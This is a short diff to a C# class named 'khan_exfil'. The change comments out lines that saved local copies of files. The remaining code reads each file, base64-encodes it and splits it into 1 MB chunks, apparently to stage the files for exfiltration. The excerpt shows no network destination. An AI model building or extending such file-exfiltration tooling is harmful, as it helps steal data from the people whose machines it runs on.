@@ -118,14 +118,14 @@ public class khan_exfil
 				Console.WriteLine("{0}: {1}: {2} : {3}", fi.Name, fi.LastAccessTime, fi.Length , fi.DirectoryName);
 				byte[] bytes = System.IO.File.ReadAllBytes(fi.DirectoryName+"\\"+fi.Name);
 		
-				File.WriteAllBytes("Khan"+i.ToString()+fi.Extension, bytes);
+				//File.WriteAllBytes("Khan"+i.ToString()+fi.Extension, bytes);
 				string hex = BitConverter.ToString(bytes);
 			
-				File.WriteAllText("Khan_hex"+i.ToString()+".txt", hex);
+				//File.WriteAllText("Khan_hex"+i.ToString()+".txt", hex);
 				string base64 = Convert.ToBase64String(bytes);
-				File.WriteAllText("Khan_b64"+i.ToString()+".txt", base64);
+				//File.WriteAllText("Khan_b64"+i.ToString()+".txt", base64);
 				byte[] bytes_ = System.Convert.FromBase64String(base64);
-				File.WriteAllBytes("Khan_back"+i.ToString()+fi.Extension, bytes_);
+				//File.WriteAllBytes("Khan_back"+i.ToString()+fi.Extension, bytes_);
 				i++;
 				master_files=obj.WriteInChunks(base64,1000000,fi.Name,master_files); //1000k = 1mb
 				if(master_files.Equals("0") ==false) 
